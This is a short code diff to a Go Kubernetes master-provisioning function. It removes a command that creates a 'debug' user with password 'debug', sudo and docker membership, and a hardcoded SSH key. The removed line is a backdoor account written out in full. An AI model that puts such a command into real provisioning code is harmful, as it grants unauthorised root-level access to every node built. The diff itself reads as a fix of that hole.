@@ -65,7 +65,6 @@ func CreatePrimaryMaster(platform *platform.Platform) (*konfigadm.Config, error)
 	if err := addCerts(platform, cfg); err != nil {
 		return nil, errors.Wrap(err, "failed to add certs")
 	}
-	cfg.AddCommand("useradd debug; echo 'debug:debug' | chpasswd; adduser debug sudo; adduser debug docker;mkdir -p /home/debug/.ssh; touch /home/debug/.ssh/authorized_keys; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCjSTjgX3GeHQc47Nw1rKF4IwvlR09CncjTsK3GORm9ZpUxPkXhLIQ7xHktYKftapB+zzjfjG02ZtIDwGHYypi5qXLRqPxSLOxjASPIZoErb7WLZ745btEb3pmjBEt19v4fbVFUyr4eqIWzDHGh81Pj2DCuirlMvlWwiHYCiBUsZcRtAlg/u2z4BTfthR2skPvck3Fr3yfL51BHgdv1gdD4n+aAquzxdJV74ED5p9+MKYc7IDkb5NBZf1/8iC3LFw4QjM07ibPc4SDzOMHGRLjCXuEwphfKyv56v1L9lMXXcVrwFSwPCtqQu1uVA2iBufgShq8eWcujLbthfcwP+4v philip@silent' >> /home/debug/.ssh/authorized_keys; chown debug:debug /home/debug/.ssh/authorized_keys; chmod 600 /home/debug/.ssh/authorized_keys")
 	cfg.AddCommand(kubeadmInitCmd)
 	return cfg, nil
 }
